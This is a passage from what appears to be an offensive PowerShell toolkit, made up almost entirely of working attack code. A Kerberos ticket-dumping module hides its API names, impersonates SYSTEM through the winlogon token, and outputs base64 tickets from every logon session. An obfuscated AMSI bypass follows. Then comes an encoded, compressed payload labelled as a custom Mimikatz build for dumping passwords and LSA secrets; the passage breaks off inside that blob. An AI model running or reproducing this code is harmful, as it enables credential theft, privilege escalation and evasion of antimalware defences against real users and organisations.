    $dF3 = ([regex]::Matches("egakcaPnoitacitnehtuAllaCasL", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF4 = ([regex]::Matches("yromeMypoCltR", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF5 = ([regex]::Matches("ssecorPnogoLretsigereDasL", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF6 = ([regex]::Matches("ataDnoisseSnogoLteGasL", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF7 = ([regex]::Matches("reffuBnruteReerFasL", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF8 = ([regex]::Matches("snoisseSnogoLetaremunEasL", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF9 = ([regex]::Matches("detsurtnUtcennoCasL", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF10 = ([regex]::Matches("ssecorPnepO", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF11 = ([regex]::Matches("nekoTssecorPnepO", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF12 = ([regex]::Matches("xEnekoTetacilpuD", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dF13 = ([regex]::Matches("resUnOdeggoLetanosrepmI", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $dX1 = ([regex]::Matches("lld.23ruces", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dX2 = ([regex]::Matches("lld.lldtn", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dX3 = ([regex]::Matches("lld.23lenreK", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''
    $dX4 = ([regex]::Matches("lld.23ipavdA", '.', 'RightToLeft') | ForEach-Object { $_.Value }) -join ''

    $FnLsaLookupAuthenticationPackage = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX1 -functionName $dF1), (Invoke-GetDelegate @([IntPtr], [KerbDump.LSA_STRING_IN].MakeByRefType(), [UInt32].MakeByRefType()) ([Int])));
    $FnLsaRegisterLogonProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX1 -functionName $dF2), (Invoke-GetDelegate @([KerbDump.LSA_STRING_IN], [IntPtr].MakeByRefType(), [UInt64].MakeByRefType()) ([Int])));
    $FnLsaCallAuthenticationPackage = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX1 -functionName $dF3), (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [Int32], [IntPtr].MakeByRefType(), [UInt64].MakeByRefType(), [Int].MakeByRefType()) ([Int])));
    $FnCopyMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX2 -functionName $dF4), (Invoke-GetDelegate @([IntPtr], [IntPtr], [UInt32]) ([Void])));
    $FnLsaDeregisterLogonProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX1 -functionName $dF5), (Invoke-GetDelegate @([IntPtr]) ([Int])));
    $FnLsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX1 -functionName $dF6), (Invoke-GetDelegate @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])));
    $FnLsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX1 -functionName $dF7), (Invoke-GetDelegate @([IntPtr]) ([UInt32])));
    $FnLsaEnumerateLogonSessions = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX1 -functionName $dF8), (Invoke-GetDelegate @([UInt32].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])));
    $FnLsaConnectUntrusted = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX1 -functionName $dF9), (Invoke-GetDelegate @([IntPtr].MakeByRefType()) ([UInt32])));
    $FnOpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX3 -functionName $dF10), (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])));
    $FnOpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX4 -functionName $dF11), (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([bool])));
    $FnDuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX4 -functionName $dF12), (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([bool])));
    $FnImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX4 -functionName $dF13), (Invoke-GetDelegate @([IntPtr]) ([bool])));
   
    function Invoke-Impersonate {

    $CurrentUserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value    
    if ($currentUserSid -eq "S-1-5-18") { return }
    
    $P1 = "Wi" + "N"
    $P2 = "lO" + "gO" + "n"
    $P3 = $P1 + $P2
    $wlgProcessId = (Get-Process $P3 | Select-Object -First 1 -ExpandProperty Id)
    $wlgProcHandle = $FnOpenProcess.Invoke(0x400, $true, [Int32]$wlgProcessId)
    if ($wlgProcHandle -eq [IntPtr]::Zero) { return $false }
    
    $wlgProcTokenHandle = [IntPtr]::Zero
    if (-not $FnOpenProcessToken.Invoke($wlgProcHandle, 0x0E, [ref]$wlgProcTokenHandle)) { return $false }
    
    $dupTokenHandle = [IntPtr]::Zero
    if (-not $FnDuplicateTokenEx.Invoke($wlgProcTokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupTokenHandle)) { return $false }
    
    try {
        
        if (-not $FnImpersonateLoggedOnUser.Invoke($dupTokenHandle)) { return $false }
        if ($currentUserSid -eq "S-1-5-18") { return } else { return $false }
    
        }
    
    catch { return $false }
    
    return $false
}
    
    Function LsaRegisterLogonProcess {
        
        $lsaLogonProcessName = "User32LogonProcess"
        $lsaString = New-Object KerbDump.LSA_STRING_IN
        $lsaHandle = New-Object System.IntPtr
        [System.UInt64]$lsaSecurityMode = 0
        $lsaString.Length = [System.UInt16]$lsaLogonProcessName.Length
        $lsaString.MaximumLength = [System.UInt16]($lsaLogonProcessName.Length + 1)
        $lsaString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($lsaLogonProcessName)
        [int]$lsaRegisterStatus = $FnLsaRegisterLogonProcess.Invoke($lsaString, [ref]$lsaHandle, [ref]$lsaSecurityMode)
        if ($lsaRegisterStatus -ne 0) {
            return (LsaConnectUntrusted)
        }
        
        return $lsaHandle
    }

    function LsaConnectUntrusted {
        
        $lsaHandle = New-Object System.IntPtr
        [int]$lsaConnectStatus = $FnLsaConnectUntrusted.Invoke([ref]$lsaHandle)
        if ($lsaConnectStatus -ne 0) {
            throw "LsaConnectUntrusted failed with error code: $lsaConnectStatus"
            return -1
        }
        return $lsaHandle
    }

    Function Get-LsaHandle {
        
        $impersonationSuccess = Invoke-Impersonate
        if ($impersonationSuccess) {
            return LsaRegisterLogonProcess
        }
        else {
            return LsaConnectUntrusted
        }
    }
    
    Function Get-LogonSessionData($luid) {
        $luidptr = New-Object System.IntPtr
        $sessionDataPtr = New-Object System.IntPtr
        try {
            $luidptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($luid))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($luid, $luidptr, $false)
            $ret = $FnLsaGetLogonSessionData.Invoke($luidptr, [ref]$sessionDataPtr)
            if ($ret -eq 0) {
                
                $type = New-Object KerbDump.SECURITY_LOGON_SESSION_DATA
                $type = $type.GetType()
                
                [KerbDump.SECURITY_LOGON_SESSION_DATA]$unsafeData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($sessionDataPtr, [type]$type)
                
                $LSD = New-Object KerbDump.LogonSessionData
                $LSD.AuthenticationPackage = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.AuthenticationPackage.Buffer, $unsafeData.AuthenticationPackage.Length / 2)
                $LSD.DnsDomainName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.DnsDomainName.Buffer, $unsafeData.DnsDomainName.Length / 2)
                $LSD.LogonID = $unsafeData.LogonID
                $LSD.LogonTime = [System.DateTime]::FromFileTime($unsafeData.LogonTime)
                $LSD.LogonServer = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonServer.Buffer, $unsafeData.LogonServer.Length / 2)
                
                [KerbDump.LogonType]$LSD.LogonType = $unsafeData.LogonType
                
                $LSD.Sid = New-Object System.Security.Principal.SecurityIdentifier($unsafeData.PSid)
                $LSD.Upn = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.Upn.Buffer, $unsafeData.Upn.Length / 2)
                $LSD.Session = [int]$unsafeData.Session
                $LSD.username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.username.Buffer, $unsafeData.username.Length / 2)
                $LSD.LogonDomain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonDomain.buffer, $unsafeData.LogonDomain.Length / 2)
            }
        }
        finally {
            
            if ($sessionDataPtr -ne [System.IntPtr]::Zero) {
                
                $FnLsaFreeReturnBuffer.Invoke($sessionDataPtr) > $null
            }
            
            if ($luidptr -ne [System.IntPtr]::Zero) {
                
                $FnLsaFreeReturnBuffer.Invoke($luidptr) > $null
            }
        }
        
        return $LSD
    }

    Function Get-CurrentLogon {
        
        $klistOutput = klist
        return $klistOutput.split("n")[1].split(":")[1]
    }

    Function Is-RunningAsAdministrator {
        
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $princ = New-Object System.Security.Principal.WindowsPrincipal($user)
        return $princ.IsInRole("Administrators") -or $user.Name -match $ntAuthorityRegexPattern
    }

    Function Extract-Ticket([intptr]$lsaHandle, [int]$authenticationPackageId, [KerbDump.LUID]$luid = (New-Object KerbDump.LUID), [string]$targetName, [System.UInt32]$flags = 0, $ticketObject) {
        
        $returnBufferPointer = [System.IntPtr]::Zero
        $retrieveRequest = New-Object KerbDump.KERB_RETRIEVE_TKT_REQUEST
        $retrieveRequestType = $retrieveRequest.GetType()
        $retrieveResponse = New-Object KerbDump.KERB_RETRIEVE_TKT_RESPONSE
        $retrieveResponseType = $retrieveResponse.GetType()
        $responseBufferLength = 0
        $protocolStatus = 0
        $structSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$retrieveRequestType)
        $retrieveRequest.MessageType = [KerbDump.KERB_PROTOCOL_MESSAGE_TYPE]::KerbRetrieveEncodedTicketMessage
        $retrieveRequest.LogonId = $luid
        $retrieveRequest.TicketFlags = 0x0
        $retrieveRequest.CacheOptions = 0x8
        $retrieveRequest.EncryptionType = 0x0
        $targetNameStruct = New-Object KerbDump.UNICODE_STRING
        $targetNameStruct.Length = [System.UInt16]($targetName.Length * 2)
        $targetNameStruct.MaximumLength = [System.UInt16](($targetNameStruct.Length) + 2)
        $targetNameStruct.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($targetName)
        $retrieveRequest.TargetName = $targetNameStruct
        $totalSize = $structSize + $targetNameStruct.MaximumLength
        $requestBufferPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($totalSize)
        
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($retrieveRequest, $requestBufferPtr, $false)
        
        $targetNameBufferPtr = [System.IntPtr]([System.Int64]($requestBufferPtr.ToInt64() + [System.Int64]$structSize))
        $FnCopyMemory.Invoke($targetNameBufferPtr, $targetNameStruct.buffer, $targetNameStruct.MaximumLength)
        
        if ([System.IntPtr]::Size -eq 8) {
            
            $size = 24
        }
        else {
            
            $size = 16
        }
        
        [System.Runtime.InteropServices.Marshal]::WriteIntPtr($requestBufferPtr, $size, $targetNameBufferPtr)
        $rc = $FnLsaCallAuthenticationPackage.Invoke($lsaHandle, $authenticationPackageId, $requestBufferPtr, $totalSize, [ref]$returnBufferPointer, [ref]$responseBufferLength, [ref]$protocolStatus)
        
        if (($rc -eq 0) -and ($responseBufferLength -ne 0)) {
            
            $retrieveResponse = [System.Runtime.InteropServices.Marshal]::PtrToStructure($returnBufferPointer, [type]$retrieveResponseType)
            $encodedTicketSize = $retrieveResponse.Ticket.EncodedTicketSize
            $encodedTicket = [System.Array]::CreateInstance([byte], $encodedTicketSize)
            [System.Runtime.InteropServices.Marshal]::Copy($retrieveResponse.Ticket.EncodedTicket, $encodedTicket, 0, $encodedTicketSize)
        }
        
        $FnLsaFreeReturnBuffer.Invoke($returnBufferPointer)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($requestBufferPtr)
        
        $tobj = New-Object psobject
        $tobj | Add-Member -Type NoteProperty -Name "success" -Value $true
        
        try {
            
            $tobj | Add-Member -Type NoteProperty -Name "Ticket" -Value $([Convert]::ToBase64String($encodedTicket))
            $tobj | Add-Member -Type NoteProperty -Name "SessionKeyType" -Value $retrieveResponse.Ticket.SessionKey.KeyType
        }
        catch {
            $tobj.success = $false
        }
        
        return $tobj
    }
    
    Function Enumerate-LogonSessions {
        $luids = @()
        if (!(Is-RunningAsAdministrator)) {
            
            $strLuid = Get-CurrentLogon
            $intLuid = [convert]::ToInt32($strluid, 16)
            $luid = New-Object KerbDump.LUID
            $luid.LowPart = $intLuid
            $luids += $luid
        }
        else {
            
            $count = New-Object System.Int32
            $luidptr = New-Object System.IntPtr
            $ret = $FnLsaEnumerateLogonSessions.Invoke([ref]$count, [ref]$luidptr)
            
            if ($ret -ne 0) {
                $ret
            }
            else {
                
                $Luidtype = New-Object KerbDump.LUID
                $Luidtype = $Luidtype.GetType()
                
                for ($i = 0; $i -lt [int32]$count; $i++) {
                    $luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($luidptr, [type]$Luidtype)
                    $luids += $luid
                    [System.IntPtr]$luidptr = $luidptr.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf([type]$Luidtype)
                }
                
                $FnLsaFreeReturnBuffer.Invoke($luidptr)
            }
        }
        
        return $luids
    }

    $seenTickets = @{}
    Function Display-ServiceTickets($serviceTicketCollections, $TGT) {
        foreach ($ticketSet in $serviceTicketCollections) {
            if ($ticketSet.Ticketb64 -ne $null -and (@($ticketSet).Count -gt 0) -and ($ticketSet[0].LogonSession[0].LogonID.LowPart -ne "0")) {
                foreach ($ticket in $ticketSet) {
                    $ticketKey = $ticket.ServerName + $ticket.Ticketb64
                    if (-not $seenTickets.Contains($ticketKey)) {
                        $seenTickets[$ticketKey] = $true
                        if ($TGT -and $ticket.ServerName -like "*krbtgt*") {
                            Write-TicketDetails $ticket
                        }
                        elseif (-not $TGT) {
                            Write-TicketDetails $ticket
                        }
                    }
                }
            }
        }
    }

    Function Write-TicketDetails($ticket) {
        
        Write-Output ("Service Name     : {0}" -f $ticket.ServerName)
        Write-Output ("EncryptionType   : {0}" -f ([KerbDump.EncTypes]$ticket.EncryptionType))
        Write-Output ("Ticket Exp       : {0}" -f $ticket.EndTime)
        Write-Output ("Server Name      : {0}@{1}" -f ($ticket.ServerName -split "/")[1], $ticket.ServerRealm)
        Write-Output ("UserName         : {0}@{1}" -f $ticket.ClientName, $ticket.ClientRealm)
        Write-Output ("Flags            : {0}" -f $ticket.TicketFlags)
        
        if ($ticket.SessionKeyType) {
            Write-Output ("Session Key Type : {0}n" -f $ticket.SessionKeyType)
        }
    
        Write-Output ""
        Write-Output "-[Ticket]-"
        Write-Output ""
        Write-Output $ticket.Ticketb64
        Write-Output ""
    }
    
    Function Main {
        
        $kerberosAuthPackageId = New-Object System.Int32
        $returnCode = New-Object System.Int32
        $kerberosPackageName = "kerberos"
        $kerberosLsaString = New-Object KerbDump.LSA_STRING_IN
        $kerberosLsaString.Length = [uint16]$kerberosPackageName.Length
        $kerberosLsaString.MaximumLength = [uint16]($kerberosPackageName.Length + 1)
        $kerberosLsaString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($kerberosPackageName)
        $lsaHandle = Get-LsaHandle
        
        $returnCode = $FnLsaLookupAuthenticationPackage.Invoke($lsaHandle, [ref]$kerberosLsaString, [ref]$kerberosAuthPackageId)
        if ($returnCode -ne 0) {
            return -1
        }
        
        foreach ($currentLuid in Enumerate-LogonSessions) {
            
            if ([System.Convert]::ToString($currentLuid.LowPart, 16) -eq 0x0) {
                continue
            }
            else {
                
                $logonSessionData = New-Object KerbDump.LogonSessionData
                try {
                    $logonSessionData = Get-LogonSessionData($currentLuid)
                }
                catch {
                    continue
                }
                
                $ticketCollection = @()
                $ticketsPointer = New-Object System.IntPtr
                $returnBufferLength = 0
                $protocolStatus = 0
                $ticketCacheRequest = New-Object KerbDump.KERB_QUERY_TKT_CACHE_REQUEST
                $ticketCacheResponse = New-Object KerbDump.KERB_QUERY_TKT_CACHE_RESPONSE
                $ticketCacheResponseType = $ticketCacheResponse.GetType()
                $ticketCacheEntry = New-Object KerbDump.KERB_TICKET_CACHE_INFO_EX
                $ticketCacheRequest.MessageType = [KerbDump.KERB_PROTOCOL_MESSAGE_TYPE]::KerbQueryTicketCacheExMessage
                $ticketCacheRequest.LogonId = $logonSessionData.LogonID
                $ticketQueryPointer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest))
                
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ticketCacheRequest, $ticketQueryPointer, $false)
                $returnCode = $FnLsaCallAuthenticationPackage.Invoke($lsaHandle, $kerberosAuthPackageId, $ticketQueryPointer, [System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest), [ref]$ticketsPointer, [ref]$returnBufferLength, [ref]$protocolStatus)
                
                if (($returnCode -eq 0) -and ($ticketsPointer -ne [System.IntPtr]::Zero)) {
                    
                    [KerbDump.KERB_QUERY_TKT_CACHE_RESPONSE]$ticketCacheResponse = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ticketsPointer, [type]$ticketCacheResponseType)
                    $ticketCount = $ticketCacheResponse.CountOfTickets
                    if ($ticketCount -ne 0) {
                        
                        $cacheInfoType = $ticketCacheEntry.GetType()
                        $entrySize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$cacheInfoType)
                        
                        for ($ticketIndex = 0; $ticketIndex -lt $ticketCount; $ticketIndex++) {
                            
                            [System.IntPtr]$currentTicketPtr = [int64]($ticketsPointer.ToInt64() + [int](8 + $ticketIndex * $entrySize))
                            [KerbDump.KERB_TICKET_CACHE_INFO_EX]$ticketCacheEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($currentTicketPtr, [type]$cacheInfoType)
                            
                            $ticketObject = New-Object psobject
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "StartTime" -Value ([datetime]::FromFileTime($ticketCacheEntry.StartTime))
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "EndTime" -Value ([datetime]::FromFileTime($ticketCacheEntry.EndTime))
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "RenewTime" -Value ([datetime]::FromFileTime($ticketCacheEntry.RenewTime))
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "TicketFlags" -Value ([KerbDump.TicketFlags]$ticketCacheEntry.TicketFlags)
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "EncryptionType" -Value $ticketCacheEntry.EncryptionType
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "ServerName" -Value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheEntry.ServerName.Buffer, $ticketCacheEntry.ServerName.Length / 2))
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "ServerRealm" -Value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheEntry.ServerRealm.Buffer, $ticketCacheEntry.ServerRealm.Length / 2))
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "ClientName" -Value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheEntry.ClientName.Buffer, $ticketCacheEntry.ClientName.Length / 2))
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "ClientRealm" -Value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheEntry.ClientRealm.Buffer, $ticketCacheEntry.ClientRealm.Length / 2))
                            Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "LogonSession" -Value $logonSessionData
                            
                            $extractionResult = (Extract-Ticket $lsaHandle $kerberosAuthPackageId $ticketCacheRequest.LogonId $ticketObject.ServerName $ticketCacheEntry.TicketFlags $ticketObject)
                            
                            if ($extractionResult.success -eq $true) {
                                
                                $sessionKeyTypeValue = $extractionResult.SessionKeyType
                                $encodedTicketData = $extractionResult.Ticket
                                Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "Ticketb64" -Value " $encodedTicketData"
                                
                                try {
                                    if ($sessionKeyTypeValue -ne 0) {
                                        
                                        Add-Member -InputObject $ticketObject -MemberType NoteProperty -Name "SessionKeyType" -Value ([KerbDump.EncTypes]$sessionKeyTypeValue)
                                    }
                                }
                                catch {}
                            }
                            
                            $ticketCollection += $ticketObject
                        }
                    }
                    
                    $FnLsaFreeReturnBuffer.Invoke($ticketsPointer) | Out-Null
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ticketQueryPointer)
                    $scs += @(, $ticketCollection)
                }
            }
        }
        
        $FnLsaDeregisterLogonProcess.Invoke($lsaHandle) | Out-Null
        if ($TGT) { Display-ServiceTickets $scs $true } else { Display-ServiceTickets $scs $false }
    }

    if ($Monitor -ne 0) {
        $endTime = (Get-Date).AddMinutes($Monitor)
    
        while ((Get-Date) -lt $endTime) {
            Main
            Start-Sleep -Seconds 1
        }
    
    }
    else {
        Main
    }
}
'@

################################################################################################################
#################################### Other: Invoke-GuiltySpark #################################################
################################################################################################################
# AmS1 bypa5S.
$Global:Arbiter = @'
Function Invoke-GuiltySpark {$X="5492868772801748688168747280728187173688878280688776828";$Y="1173680867656877679866880867644817687416876797271";[Ref]."A`ss`Embly"."GET`TY`Pe"((0..37|%{[char][int](29+($X+$Y).Substring(($_*2),2))})-join'').GetField((38..51|%{[char][int](29+($X+$Y).Substring(($_*2),2))})-join'','NonPublic,Static').SetValue($null,$([Convert]::ToBoolean("True")))}
Invoke-GuiltySpark
'@

################################################################################################################
################################ Module: ekeys, logonpasswords, lsa ############################################
################################################################################################################

# Custom built and compressed version of our favourite Mim`i tool. 
$Global:Pandemonium = @'
& (  'SEt' +  '-'  +'vaRi' +'AbLe' )  ( 'f' + ( 'ML' + '7' )  )  (   [type]( "{1}{2}{0}" -F 'Rt',(  'c'  +  'onv' ),'E')   ) ;   ${0d`S7}    = [tyPe]("{1}{2}{3}{4}{0}{6}{5}"-f(  'e'+  'SSI'),('i' + 'O.CO' ),'m','P',('ReS'+  's'+  'IO'  + 'n.ComPR'),( 'N'  + 'mOdE'  ),'o')  ;      &  ( 'SE'+ 'T' )  (  ('U' +  'mK')  +  "P")  (   [TYPe]("{1}{2}{0}{3}" -f (  'x'  +'T.E'),('S' + 'ySt'  ),('E'+  'M.TE'  ),('Nc'+ 'od'+ 'INg' ))   )   ;( &  (  'neW-O'+  'b'  + 'Je'+ 'CT')  ( 'SY' + 'stE'  +'m.Io'+  '.COmP' + 'R' +'e'+  'ssIO'+'n.dEFlat'+  'E'+'StRE'+ 'AM' )( [IO.meMOrySTrEaM]   ${fM`l7}::( 'fRo' +  'MBA'+  'SE6' + '4StrIN' + 'g'  ).Invoke(  ('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